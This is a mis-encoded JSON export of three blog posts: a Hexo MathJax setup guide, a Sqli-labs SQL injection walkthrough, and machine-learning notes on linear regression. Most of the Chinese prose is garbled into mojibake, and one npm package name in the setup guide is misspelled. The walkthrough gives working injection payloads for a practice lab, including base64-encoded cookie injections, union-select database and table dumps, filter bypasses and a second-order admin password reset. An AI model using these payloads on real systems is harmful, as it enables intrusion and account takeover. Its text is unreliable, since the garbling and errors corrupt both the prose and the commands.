ï¼Œå…¶ä¸­æ¶‰åŠåˆ°çš„å…¬å¼æ¯”å¤šï¼ŒåŒ…æ‹¬çº¿æ€§ä»£æ•°å’Œå¾®åˆ†ã€‚è¿™é‡ŒåŸºäº Hexo ä»‹ç»å¦‚ä½•åœ¨åšå®¢ä¸Šè¿›è¡Œ LaTeX å…¬å¼çš„ç¼–å†™å’Œæ¸²æŸ“ã€‚ åœ¨ Hexo ä¸­é…ç½® MathJax ç¯å¢ƒé…ç½® Hexo ä¸­å¯¹ç½‘é¡µè¿›è¡Œæ¸²æŸ“çš„ marked å¹¶ä¸æ”¯æŒ mathjaxï¼Œæˆ‘ä»¬ç”¨ Git Bash è¿›å…¥åšå®¢å·¥ç¨‹æ‰€åœ¨çš„æ–‡ä»¶å¤¹ä¸‹å¹¶æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 1npm uninstall hexo-renderer-marked --savenpm install hexo-renderer-kramed --save åœæ­¢ hexo-math å¸è½½å¯èƒ½å®‰è£…çš„ hexo-math 1npm uninstall hexo-math --save å†å®‰è£… hexo-renderer-mathjax åŒ… 1npm install hexo-rederer-mathjax æ›´æ–° mathjax çš„ CDN è¿æ¥ æŒ‰ç…§ node_modules â†’â†’ hexo-renderer-mathjax çš„é¡ºåºè¿›å…¥ç›®å½•ï¼Œå¯¹ mathjax.html æ–‡æ¡£è¿›è¡Œä¿®æ”¹ï¼ŒæŠŠ `` æ”¹ä¸º 1&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;mathjax&#x2F;2.7.1&#x2F;MathJax.js?config&#x3D;TeX-MML-AM_CHTML&quot;&gt;&lt;&#x2F;script&gt; æ›´æ”¹é»˜è®¤çš„è½¬ä¹‰è§„åˆ™ å› ä¸º Hexo åœ¨å¤„ç†ç‰¹æ®Šå­—ç¬¦æ—¶ä¼šå¯¹æŸäº›å­—ç¬¦è½¬ä¸º html ä¸­çš„ç½‘é¡µæ ‡ç­¾ï¼Œæˆ‘ä»¬æŒ‰ç…§ node_modules â†’â†’ kramed â†’â†’ lib â†’â†’ rules çš„é¡ºåºè¿›å…¥ç›®å½•å¹¶ä¿®æ”¹ inline.js ï¼Œå°†å…¶ä¸­çš„ä¸¤è¡Œ 1escape: &#x2F;^\\\\([\\\\&#96;*&#123;&#125;\\[\\]()#$+\\-.!_&gt;])&#x2F;,em: &#x2F;^\\b_((?:__|[\\s\\S])+?)_\\b|^\\*((?:\\*\\*|[\\s\\S])+?)\\*(?!\\*)&#x2F;, å¯¹åº”ä¿®æ”¹ä¸º 1escape: &#x2F;^\\\\([&#96;*\\[\\]()#$+\\-.!_&gt;])&#x2F;,em: &#x2F;^\\*((?:\\*\\*|[\\s\\S])+?)\\*(?!\\*)&#x2F;, å¼€å¯ mathjax è¿›å…¥å·¥ç¨‹ç›®å½•çš„ä¸»é¢˜æ–‡ä»¶å¤¹ä¸‹ï¼Œæ‰¾åˆ° _config.yml æ–‡ä»¶å¹¶å¼€å¯ mathjaxï¼š 12mathjax: enable: true åœ¨æˆ‘ä»¬æ¯ä¸€æ¬¡ä½¿ç”¨ Git Bash åˆ›å»ºåšå®¢æ–‡ç« åï¼ŒHexo éƒ½ä¼šè‡ªåŠ¨ä¸ºæˆ‘ä»¬ç”Ÿæˆå¤´éƒ¨ä¿¡æ¯ï¼Œæˆ‘ä»¬åœ¨éœ€è¦æ’å…¥ LaTeX å…¬å¼çš„åšå®¢çš„å¤´éƒ¨åŠ ä¸Š 1mathjax: true è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨åšå®¢ä¸­ç¼–å†™æ•°å­¦å…¬å¼äº†ã€‚","tags":[{"name":"hexo","slug":"hexo","permalink":"http://ca0y1h.top/tags/hexo/"}],"categories":[{"name":"æŠ€æœ¯éšç¬”","slug":"æŠ€æœ¯éšç¬”","permalink":"http://ca0y1h.top/categories/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"}]},{"title":"Webå®‰å…¨å­¦ä¹ ä¹‹Sqli-labsæ‰‹å·¥æ³¨å…¥â€”â€”Advanced-Injections","date":"2019-10-25T10:27:48.000Z","path":"Web_security/basic_learning/8.Sqli-labsæ‰‹å·¥æ³¨å…¥â€”â€”Advanced-Injections/","text":"Webå®‰å…¨å­¦ä¹ ä¹‹Sqli-labsæ‰‹å·¥æ³¨å…¥â€”â€”Advanced-Injections Sqli-labsæ‰‹å·¥æ³¨å…¥ç¬¬äºŒé˜¶æ®µï¼Œä¸»è¦éƒ½æ˜¯ä¸€äº›ç»•è¿‡çš„æŠ€å·§ï¼ˆåŒ…æ‹¬WAFï¼‰ã€‚ Less-21 Cookie injection-base64 encoded-single quotes and parenthesis ç™»å½•æˆåŠŸåçš„é¡µé¢ï¼š å¾ˆæ˜æ˜¾cookieå­—æ®µæ˜¯è¢«åŠ å¯†å¤„ç†äº†ï¼ˆè€Œä¸”åé¢çš„=æš´éœ²äº†åº”è¯¥æ˜¯base64ç¼–ç æ–¹å¼ï¼‰ã€‚ æ’æ’­ä¸€ä¸ªå…³äºè®²è§£base64ç¼–ç æ–¹å¼çš„åšæ–‡ï¼Œç‚¹å‡»è·³è½¬ã€‚ æŸ¥çœ‹phpæ–‡ä»¶ç¡®å®å¦‚æ­¤ï¼Œæ‰€ä»¥åªéœ€è¦ä¸Šä¼ paylaodçš„æ—¶å€™base64åŠ å¯†ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚ %3dåº”è¯¥æ˜¯=å·urldecodeçš„ç»“æœ æ¥ä¸‹æ¥æ„é€ payloadè¿›è¡Œæµ‹è¯•ï¼š 12admin&#39; and 1&#x3D;1 --+ &#x2F;&#x2F;æ˜æ–‡YWRtaW4nIGFuZCAxPTEgLS0r &#x2F;&#x2F;å¯†æ–‡ æ ¹æ®SQLé”™è¯¯ä¿¡æ¯çš„æç¤ºï¼Œåº”è¯¥æ˜¯å°‘äº†ä¸€ä¸ª)ï¼š 12admin&#39;) and 1&#x3D;1# &#x2F;&#x2F;æ˜æ–‡YWRtaW4nKSBhbmQgMT0xIw&#x3D;&#x3D; &#x2F;&#x2F;å¯†æ–‡ ç¤ºä¾‹çˆ†åº“paylaodï¼š 12-admin&#39;) union select 1,2,database()#LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpIw&#x3D;&#x3D; Less-22 Cookie injection-base64 encoded-double quotes å’Œless-21ä¸€æ ·çš„ï¼Œåªéœ€è¦ä½¿ç”¨åŒå¼•å·ä»£æ›¿å•å¼•å·å†å–æ‰æ‹¬å·å³å¯ã€‚ æ ·ä¾‹payload 12-admin&quot; union select 1,2,database()#LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj Less-23 GET-Error bases-strip comments å¤šæ¬¡è¾“å…¥å‘ç°è¿™é“é¢˜ä¸èƒ½ç”¨æ³¨é‡Šç¬¦æ¥æ³¨æ‰åé¢Limitè¯­å¥ï¼Œåªèƒ½è½¬è€Œç”¨å•å¼•å·é—­åˆçš„æ–¹å¼ã€‚ å°è¯•ï¼š 1?id&#x3D;1 and &#39; å‘ç°SQLè¯­å¥ä¸æŠ¥é”™ï¼Œé‚£ä¹ˆä¹…å¯ä»¥ä½¿ç”¨è”åˆæŸ¥è¯¢ï¼š 1?id&#x3D;-1&#39; union select 1,database(),3 and &#39; çˆ†è¡¨payloadï¼š 1?id&#x3D;-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; or &#39;1&#39;&#x3D;&#39; Less-24 POST-Second Oder Injections *Real Treate* Stored Injections é¦–å…ˆæ³¨å†Œä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œç”¨æˆ·åå¿…é¡»æ˜¯admin'#ï¼š ç„¶åç™»å½•admin'#è´¦å·ï¼Œå¹¶ä¿®æ”¹è¯¥è´¦å·çš„å¯†ç ï¼Œä½†æ­¤æ—¶ä¿®æ”¹çš„å°±æ˜¯adminçš„å¯†ç ï¼š è¿™æ˜¯å› ä¸ºï¼šSQLè¯­å¥å˜ä¸º 1UPDATE users SET passwd&#x3D;&quot;New_Pass&quot; WHERE username &#x3D;&#39; admin&#39; # &#39; AND password&#x3D;&#39; ä¹Ÿå°±æ˜¯æ‰§è¡Œäº† 12UPDATE users SET passwd&#x3D;&quot;New_Pass&quot; WHERE username &#x3D;&#39; admin&#39; å†å¯ä»¥å»åå°çš„æ•°æ®åº“æŸ¥çœ‹usersè¡¨çš„è®°å½•ï¼š å‘ç°è´¦å·adminçš„å¯†ç è¢«æ›´æ”¹äº†ï¼ï¼ï¼ äºŒæ¬¡æ³¨å…¥æˆåŠŸã€‚ Less-25 Get-Error based-All you OR &amp; AND belong to us - string single quote æ ¹æ®é¡µé¢çš„æç¤ºï¼Œå¾ˆæ˜æ˜¾ç¨‹åºæŠŠæˆ‘ä»¬è¾“å…¥çš„andå’Œorå…³é”®å­—è¿‡æ»¤æ‰äº†ã€‚ è§£å†³æ–¹æ³•å°±æ˜¯åŒå†™andæˆ–orå…³é”®å­—ï¼Œä¾‹å¦‚ï¼š","tags":[{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"http://ca0y1h.top/tags/sql%E6%B3%A8%E5%85%A5/"}],"categories":[{"name":"webå®‰å…¨","slug":"webå®‰å…¨","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"åŸºç¡€å­¦ä¹ ","slug":"webå®‰å…¨/åŸºç¡€å­¦ä¹ ","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Machine_Learning-Week1","date":"2019-10-25T05:15:45.000Z","path":"Machine_learning/basic_learning/1.Machine-Learning-Week1/","text":"Machine_Learning-Week1 æœºå™¨å­¦ä¹ ä»‹ç» ä»€ä¹ˆæ˜¯æœºå™¨å­¦ä¹ ï¼Ÿè§†é¢‘ä¸­ç»™å‡ºäº†ä¸¤ç§å®šä¹‰ï¼Œä»å…·ä½“ç†è§£æ¥çœ‹ï¼Œæˆ‘æ›´å€¾å‘äºTom Mitchellçš„å®šä¹‰ï¼ŒåŸæ–‡æ˜¯ï¼š A computer program is said to learn from experience E with respect to some class of tasks T and performance measure P, if its performance at tasks in T, as measured by P, improves with experience E. ç”¨DeepMindä¸‹å›´æ£‹æ¥è§£é‡Šå°±æ˜¯ï¼š Eï¼šä¸‹å¾ˆå¤šåœºå›´æ£‹çš„ä½“éªŒ Tï¼šæŸä¸€å±€ä¸‹æ£‹çš„ä»»åŠ¡ Pï¼šDeepMindèµ¢å¾—æ¯”èµ›çš„å¯èƒ½æ€§ æ€»ä½“æ¥è¯´ï¼Œæœºå™¨å­¦ä¹ å¯ä»¥åˆ†ä¸ºä¸¤å¤§ç±»ï¼šç›‘ç£å­¦ä¹ ï¼ˆsupervised learningï¼‰å’Œæ— ç›‘ç£å­¦ä¹ ï¼ˆunsupervised learningï¼‰ã€‚ ç›‘ç£å­¦ä¹  åœ¨ç›‘ç£å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬äº‹å…ˆå°±æœ‰äº†ä¸€ä¸ªæ•°æ®é›†ï¼Œå¹¶ä¸”å·²ç»çŸ¥é“æ­£ç¡®çš„è¾“å‡ºåº”è¯¥æ˜¯ä»€ä¹ˆæ ·å­ï¼Œå¹¶è®¤ä¸ºè¾“å…¥å’Œè¾“å‡ºä¹‹é—´å­˜åœ¨æŸç§è”ç³»ã€‚ ç›‘ç£å­¦ä¹ é—®é¢˜åˆ†ä¸ºâ€œå›å½’ï¼ˆregressionï¼‰â€å’Œâ€œåˆ†ç±»ï¼ˆclassificationï¼‰â€é—®é¢˜ã€‚ åœ¨å›å½’é—®é¢˜ä¸­ï¼Œæˆ‘ä»¬è¯•å›¾é¢„æµ‹è¿ç»­è¾“å‡ºä¸­çš„ç»“æœï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬è¯•å›¾å°†è¾“å…¥å˜é‡æ˜ å°„åˆ°æŸä¸ªè¿ç»­å‡½æ•°ã€‚ åœ¨åˆ†ç±»é—®é¢˜ä¸­ï¼Œæˆ‘ä»¬æ”¹ä¸ºå°è¯•é¢„æµ‹ç¦»æ•£è¾“å‡ºä¸­çš„ç»“æœã€‚ æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬æ­£åœ¨å°è¯•å°†è¾“å…¥å˜é‡æ˜ å°„ä¸ºç¦»æ•£ç±»åˆ«ã€‚ ä¸¾ä¾‹æ¥è¯´ï¼š ç»™å®šæ•°æ®ï¼Œé¢„æµ‹æˆ¿å±‹çš„å…·ä½“ä»·æ ¼ã€‚åˆ¤æ–­æ˜¯å›å½’é—®é¢˜è¿˜æ˜¯åˆ†ç±»é—®é¢˜ï¼Œä»·æ ¼ä½œä¸ºè§„æ¨¡çš„å‡½æ•°æ˜¯ä¸€ä¸ªè¿ç»­çš„è¾“å‡ºï¼Œå› æ­¤è¿™æ˜¯ä¸€ä¸ªå›å½’é—®é¢˜ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬æŠŠè¾“å‡ºæ”¹å˜ä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¾“å‡ºå…³äºæˆ¿å±‹æ˜¯å¦â€œä»¥é«˜äºæˆ–ä½äºè¦ä»·çš„ä»·æ ¼å‡ºå”®â€çš„è¾“å‡ºï¼Œä»è€Œå°†è¿™ä¸ªç¤ºä¾‹è½¬å˜ä¸ºåˆ†ç±»é—®é¢˜ã€‚ åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬æ ¹æ®ä»·æ ¼å°†æˆ¿å±‹åˆ†ä¸ºä¸¤ä¸ªç¦»æ•£ç±»åˆ«ã€‚ æ‰€ä»¥æˆ‘ä»¬åˆ¤æ–­ä¸€ä¸ªæœºå™¨å­¦ä¹ çš„é—®é¢˜æ˜¯åˆ†ç±»é—®é¢˜è¿˜æ˜¯å›å½’é—®é¢˜ï¼Œæˆ‘ä»¬çœ‹çš„æ˜¯å®ƒçš„è¾“å‡ºç±»å‹ï¼Œå¦‚æœæ˜¯ç¦»æ•£æ•°æ®é‚£ä¹ˆå°±æ˜¯ä¸€ä¸ªåˆ†ç±»é—®é¢˜ï¼Œå¦‚æœæ˜¯è¿ç»­æ•°æ®ï¼Œé‚£ä¹ˆå°±æ˜¯å›å½’é—®é¢˜ã€‚ æ— ç›‘ç£å­¦ä¹  æˆ‘ä»¬æœ‰ä¸€äº›é—®é¢˜ï¼Œä½†æ˜¯ä¸çŸ¥é“ç­”æ¡ˆï¼Œæˆ‘ä»¬è¦åšçš„æ— ç›‘ç£å­¦ä¹ å°±æ˜¯æŒ‰ç…§ä»–ä»¬çš„æ€§è´¨æŠŠä»–ä»¬è‡ªåŠ¨åœ°åˆ†æˆå¾ˆå¤šç»„ï¼Œæ¯ç»„çš„é—®é¢˜æ˜¯å…·æœ‰ç±»ä¼¼æ€§è´¨çš„ï¼ˆæ¯”å¦‚æ•°å­¦é—®é¢˜ä¼šèšé›†åœ¨ä¸€ç»„ï¼Œè‹±è¯­é—®é¢˜ä¼šèšé›†åœ¨ä¸€ç»„ï¼Œç‰©ç†â€¦ï¼‰ã€‚ æ‰€æœ‰æ•°æ®åªæœ‰ç‰¹å¾å‘é‡æ²¡æœ‰æ ‡ç­¾ï¼Œä½†æ˜¯å¯ä»¥å‘ç°è¿™äº›æ•°æ®å‘ˆç°å‡ºèšç¾¤çš„ç»“æ„ï¼Œæœ¬è´¨æ˜¯ä¸€ä¸ªç›¸ä¼¼çš„ç±»å‹çš„ä¼šèšé›†åœ¨ä¸€èµ·ã€‚æŠŠè¿™äº›æ²¡æœ‰æ ‡ç­¾çš„æ•°æ®åˆ†æˆä¸€ä¸ªä¸€ä¸ªç»„åˆï¼Œå°±æ˜¯èšç±»ï¼ˆClusteringï¼‰ã€‚æ¯”å¦‚Googleæ–°é—»ï¼Œæ¯å¤©ä¼šæœé›†å¤§é‡çš„æ–°é—»ï¼Œç„¶åæŠŠå®ƒä»¬å…¨éƒ¨èšç±»ï¼Œå°±ä¼šè‡ªåŠ¨åˆ†æˆå‡ åä¸ªä¸åŒçš„ç»„ï¼ˆæ¯”å¦‚å¨±ä¹ï¼Œç§‘æŠ€ï¼Œæ”¿æ²»â€¦ï¼‰ï¼Œæ¯ä¸ªç»„å†…æ–°é—»éƒ½å…·æœ‰ç›¸ä¼¼çš„å†…å®¹ç»“æ„ã€‚ æ— ç›‘ç£å­¦ä¹ è¿˜æœ‰ä¸€ä¸ªå…¸å‹çš„ä¾‹å­å°±æ˜¯é¸¡å°¾é…’ä¼šé—®é¢˜ï¼ˆå£°éŸ³çš„åˆ†ç¦»ï¼‰ï¼Œåœ¨è¿™ä¸ªé…’ä¼šä¸Šæœ‰ä¸¤ç§å£°éŸ³ï¼Œè¢«ä¸¤ä¸ªä¸åŒçš„éº¦å…‹é£åœ¨ä¸åŒçš„åœ°æ–¹æ¥æ”¶åˆ°ï¼Œè€Œå¯ä»¥åˆ©ç”¨æ— ç›‘ç£å­¦ä¹ æ¥åˆ†ç¦»è¿™ä¸¤ç§ä¸åŒçš„å£°éŸ³ã€‚æ³¨æ„åˆ°è¿™é‡Œæ˜¯æ— ç›‘ç£å­¦ä¹ çš„åŸå› æ˜¯ï¼Œäº‹å…ˆå¹¶ä¸çŸ¥é“è¿™äº›å£°éŸ³ä¸­æœ‰å“ªäº›ç§ç±»ï¼ˆè¿™é‡Œçš„ç§ç±»å°±æ˜¯æ ‡ç­¾çš„æ„æ€ï¼‰ã€‚ å•å˜é‡çº¿æ€§å›å½’ ä»€ä¹ˆæ˜¯çº¿æ€§å›å½’æ¨¡å‹ï¼Ÿå›æƒ³ä¸€ä¸‹åœ¨å›å½’é—®é¢˜ä¸­ï¼Œæˆ‘ä»¬æ­£åœ¨ä½¿ç”¨è¾“å…¥å˜é‡ï¼Œå¹¶è¯•å›¾å°†è¾“å‡ºæ‹Ÿåˆåˆ°è¿ç»­çš„é¢„æœŸç»“æœå‡½æ•°ä¸­ã€‚ é‚£ä¹ˆï¼Œå…·æœ‰ä¸€ä¸ªå˜é‡çš„çº¿æ€§å›å½’ç§°ä¸ºâ€œå•å˜é‡çº¿æ€§å›å½’â€ï¼Œå³æ ¹æ®å•ä¸ªè¾“å…¥å€¼xé¢„æµ‹å•ä¸ªè¾“å‡ºå€¼yæ—¶ï¼Œä½¿ç”¨å•å˜é‡çº¿æ€§å›å½’ã€‚ å‡è®¾å‡½æ•°ï¼ˆHypothesis Functionï¼‰ $$ \\hat{y} = h_\\theta(x) = \\theta_0 + \\theta_1 x $$ çº¿æ€§å›å½’æ¨¡å‹çš„å‡è®¾å‡½æ•°å°±æ˜¯ä¸€ä¸ªä¸€å…ƒä¸€æ¬¡å¤šé¡¹å¼ï¼Œä»å‡ ä½•è§’åº¦æ¥è®²ï¼Œè¿™ä¸ªå‡½æ•°åœ¨åæ ‡è½´ä¸Šåæ˜ ä¸ºä¸€æ¡ç›´çº¿ï¼Œxæ˜¯è‡ªå˜é‡ï¼Œyæ˜¯å› å˜é‡ã€‚ ä¸¾ä¾‹æ¥è¯´ï¼š input x output y 0 4 1 7 2 7 3 8 æ ¹æ®è¡¨æ ¼ä¸­ç»™å®šçš„è¾“å…¥å’Œè¾“å‡ºï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹å‡è®¾å‡½æ•°ä¸ºï¼šhÎ¸(x)=2+2x ä½†æ˜¯æˆ‘ä»¬xè¾“å…¥1çš„è¯ï¼Œyè¾“å‡ºæ˜¯4ï¼Œè¿™ä¸å®é™…ç»™å®šå€¼åå·®äº†3ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾ä¸€ç»„æœ€åˆé€‚çš„Î¸1å’ŒÎ¸2æ¥æœ€ä½³æ‹Ÿåˆç»™å®šçš„æ•°æ®ã€‚ ä»£ä»·å‡½æ•°ï¼ˆCost Functionï¼‰ æˆ‘ä»¬ä½¿ç”¨ä»£ä»·å‡½æ•°æ¥è¡¡é‡ä¸Šé¢ç»™å®šçš„å‡è®¾å‡½æ•°çš„ç²¾ç¡®æ€§ï¼Œè¿™å°†å‡è®¾çš„æ‰€æœ‰ç»“æœå–å¹³å‡å€¼ï¼ˆå®é™…ä¸Šæ˜¯å¹³å‡å€¼çš„ç®€åŒ–ç‰ˆæœ¬ï¼‰ï¼Œå…¶ä¸­å°†xçš„è¾“å…¥ä¸å®é™…è¾“å‡ºyçš„è¾“å…¥è¿›è¡Œæ¯”è¾ƒã€‚ $$ J(\\theta_0, \\theta_1) = \\dfrac {1}{2m} \\displaystyle \\sum {i=1}^m \\left ( \\hat{y}{i}- y_{i} \\right)^2 = \\dfrac {1}{2m} \\displaystyle \\sum {i=1}^m \\left (h\\theta (x_{i}) - y_{i} \\right)^2 $$ ç”¨ç¬¦å·Jæ¥è¡¨ç¤ºä»£ä»·å‡½æ•°ï¼ŒæŠŠè¿™ä¸ªå‡½æ•°æ‹†å¼€æ¥çœ‹ä¸€ä¸‹ï¼š $$ \\sum {i=1}^m \\left (h\\theta (x_{i}) - y_{i} \\right)^2 $$ i ä¸ºç¬¬ i ä¸ªæ•°æ®ï¼Œä¸Šå¼è¡¨ç¤ºæˆ‘é€šè¿‡æ‹Ÿåˆå‡½æ•° hÎ¸(x) å¾—åˆ°çš„ç¬¬ i ä¸ªæ•°æ®ä¸çœŸå®çš„ç¬¬ i ä¸ªæ•°æ®çš„è¯¯å·®ã€‚æ€»å…±æœ‰ m ä¸ªæ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åº”è¯¥æŠŠ m ä¸ªæ•°æ®çš„è¯¯å·®æ±‚å’Œç„¶åå†æ±‚å‡ºå¹³å‡è¯¯å·®ï¼Œå¾—åˆ°ä¸‹é¢è¿™ä¸ªå¼å­ã€‚ $$ \\dfrac {1}{2m} \\displaystyle \\sum {i=1}^m \\left (h\\theta (x_{i}) - y_{i} \\right)^2 $$ å…¶å®é™¤ä»¥ m æˆ– 2m ä»£ä»·å‡½æ•°æœ€ä¼˜åŒ–çš„ç»“æœéƒ½æ˜¯ç›¸åŒçš„ï¼Œè¿™é‡Œä¸ºäº†åç»­æ±‚å¯¼è®¡ç®—æ–¹ä¾¿ï¼Œå› æ­¤ç”¨ 2må¤„ç†ã€‚ åªè¦æˆ‘è®©è¿™ä¸ªå€¼å°½å¯èƒ½çš„å°ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ‰€åšçš„æ‹Ÿåˆå‡½æ•°å°±è¶Šå‡†ç¡®ï¼Œæ‰€ä»¥åˆšæ‰æ±‚æ‹Ÿåˆå‡½æ•°çš„é—®é¢˜å°±è½¬åŒ–æˆäº†é€šè¿‡ Î¸0 å’Œ Î¸1 æ±‚ J(Î¸0, Î¸1) çš„æœ€å°å€¼ï¼ŒåŠæœ€ä¼˜åŒ–é—®é¢˜ã€‚ è®²åˆ°è¿™é‡Œï¼Œæœ‰å¿…è¦å¯¹ä¸Šé¢çš„çŸ¥è¯†ç‚¹è¿›è¡Œä¸€äº›å°çš„æ€»ç»“ï¼š é¦–å…ˆç»™äº†ä¸€ä¸ªå‡è®¾å‡½æ•°ï¼š Hypothesisï¼š $$ \\hat{y} = h_\\theta(x) = \\theta_0 + \\theta_1 x $$ ä»£ä»·å‡½æ•°ä¸­çš„Î¸0å’ŒÎ¸1æ˜¯ä»»æ„çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªå‡½æ•°æ¥åˆ¤æ–­è¿™ä¸ªå‡è®¾å‡½æ•°ä¸çœŸå®æ•°æ®ä¹‹é—´çš„æ‹Ÿåˆåº¦å¦‚ä½•ï¼Œä¸ºäº†æè¿°æ‹Ÿåˆåº¦ï¼Œæˆ‘ä»¬åˆæå‡ºäº†ä»£ä»·å‡½æ•°ï¼š $$ J(\\theta_0, \\theta_1) = \\dfrac {1}{2m} \\displaystyle \\sum {i=1}^m \\left ( \\hat{y}{i}- y_{i} \\right)^2 = \\dfrac {1}{2m} \\displaystyle \\sum {i=1}^m \\left (h\\theta (x_{i}) - y_{i} \\right)^2 $$ æˆ‘ä»¬çš„ç›®æ ‡å½“ç„¶æ˜¯ä»£ä»·å‡½æ•°çš„å€¼è¶Šå°è¶Šå¥½ï¼Œå³ç”¨æ•°å­¦å…¬å¼è¡¨ç¤ºä¸ºï¼š $$ \\min_{\\theta_1,\\theta_2} J(\\theta_1,\\theta_2) $$ ä¸ºäº†è¯´æ˜ä»£ä»·å‡½æ•°æ˜¯å¦‚ä½•è¿›è¡Œå·¥ä½œçš„ï¼Œç°åœ¨æˆ‘ä»¬æ¥ç®€åŒ–ä¸€ä¸‹é—®é¢˜ï¼Œè®© Î¸0=0ï¼Œè¿™æ ·æˆ‘ä»¬è¦æ±‚çš„æ‹Ÿåˆå‡½æ•°å°±æ˜¯ä¸€æ¡è¿‡åŸç‚¹çš„ç›´çº¿ï¼Œå‚æ•°å°±å‰©ä¸‹ä¸€ä¸ª Î¸1ï¼ŒÎ¸1 ä»£è¡¨ç›´çº¿çš„æ–œç‡ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘æƒ³è¦æ‹Ÿåˆå·¦å›¾ä¸­çš„ 3 ä¸ªç‚¹ï¼Œæˆ‘å°±è¦å–ä¸åŒçš„å‚æ•° Î¸1 è¿›è¡Œå°è¯•ï¼ŒÎ¸1 å–å€¼ä¸åŒï¼Œç›´çº¿çš„é¢œè‰²ä¸åŒã€‚è¿™é‡Œ Î¸1 åˆ†åˆ«å– 0, 0.5, 1ï¼Œç›´çº¿çš„é¢œè‰²åˆ†åˆ«ä¸ºæ·±è“ã€ç´«è‰²å’Œæµ…è“è‰²ã€‚å¦‚ä½•ç¡®å®šå“ªæ¡ç›´çº¿æ‹Ÿåˆçš„æœ€å¥½å‘¢ï¼Œæˆ‘ä»¬å°±è¦æŠŠ Î¸1 çš„ä¸åŒå–å€¼å¸¦å…¥åˆ°ä»£ä»·å‡½æ•° J(Î¸1) ä¸­ï¼ˆå³å›¾ï¼‰ã€‚è¿™é‡Œæˆ‘ä»¬å°±å‘ç°ï¼Œå½“ Î¸1=1 æ—¶ï¼Œä»£ä»·å‡½æ•°å€¼æœ€å°ä¸º 0ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ‰¾åˆ°äº†æ‹Ÿåˆå‡½æ•° hÎ¸(x)= Î¸1x çš„æœ€ä½³å‚æ•° Î¸1=1ã€‚ å¦‚æœæœ‰ä¸¤ä¸ªå‚æ•° Î¸0 å’Œ Î¸1ï¼Œé‚£ä¹ˆä»–ä»¬çš„ä»£ä»·å‡½æ•°å›¾åƒå°±æ˜¯ä¸€ä¸ªä¸‰ç»´å›¾åƒã€‚ ç”¨è½®å»“å›¾ç”»å‡ºæ¥çš„è¯å°±æ˜¯è¿™æ ·ï¼ˆè½®å»“å›¾ç±»ä¼¼äºç­‰é«˜çº¿å›¾ï¼‰ å³è¾¹çš„è½®å»“å›¾ä¸€åœˆå°±ç›¸å½“äºå·¦è¾¹çš„åŒä¸€æ¡ç›´çº¿ã€‚ æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œè¶Šå¾€è½®å»“å›¾çš„ä¸­å¿ƒä½ç½®ç§»åŠ¨ï¼Œå‡è®¾å‡½æ•°ä¸çœŸå®æ•°æ®å°±æ›´åŠ æ‹Ÿåˆã€‚ å¦‚æœæ˜¯æ¯æ¬¡è¦æˆ‘ä»¬äººå·¥å»å¯»æ‰¾è¿™ä¸ªæœ€ä½ç‚¹ï¼Œæœªå…ä¹Ÿå¤ªä¸â€œäººå·¥æ™ºèƒ½â€äº†ã€‚ æœ‰æ²¡æœ‰ä¸€ç§ç®—æ³•å¯ä»¥è‡ªåŠ¨åœ°æ±‚å‡ºä½¿å¾—ä»£ä»·å‡½æ•°æœ€å°çš„ç‚¹å‘¢ï¼Ÿæœ‰ï¼Œé‚£å°±æ˜¯æ¢¯åº¦ä¸‹é™ã€‚ ï¼ˆåˆåˆ°äº†æœ€ä¼˜åŒ–çš„é—®é¢˜äº†ï¼‰ æ¢¯åº¦ä¸‹é™ï¼ˆGradient Descentï¼‰ **æ¢¯åº¦ä¸‹é™ï¼ˆGradient descentï¼‰**æ˜¯ä¸€ä¸ªç”¨æ¥æ±‚ä»£ä»·å‡½æ•°æœ€å°å€¼çš„ç®—æ³•ã€‚æ¢¯åº¦ä¸‹é™ç®—æ³•çš„æ€æƒ³å°±æ˜¯é¦–å…ˆå…ˆä»ä¸€ç»„å‚æ•°å€¼ï¼ˆÎ¸0, Î¸1ï¼‰å¼€å§‹ï¼Œä¸æ–­åœ°å»å°è¯•å„ç§ï¼ˆÎ¸0, Î¸1ï¼‰ï¼Œç›´åˆ°ä½¿å¾—ä»£ä»·å‡½æ•° J(Î¸0, Î¸1) æœ€å°ä¸ºæ­¢ã€‚ä»¥ä¸‹å›¾ä»£ä»·å‡½æ•°ä¸ºä¾‹ï¼Œä»ä¸åŒèµ·å§‹ç‚¹å¼€å§‹ï¼Œåˆ°è¾¾çš„å±€éƒ¨æœ€ä¼˜ä½ç½®ä¸åŒï¼Œä¹Ÿå°±æ˜¯å±€éƒ¨æœ€ä¼˜è§£ä¸åŒã€‚ æ¢¯åº¦ä¸‹é™ç®—æ³•ç”¨ä»¥ä¸‹ä¼ªä»£ç è¡¨ç¤ºï¼š repeat until convergence: $$ \\theta_j := \\theta_j - \\alpha \\frac{\\partial}{\\partial \\theta_j} J(\\theta_0, \\theta_1) $$ 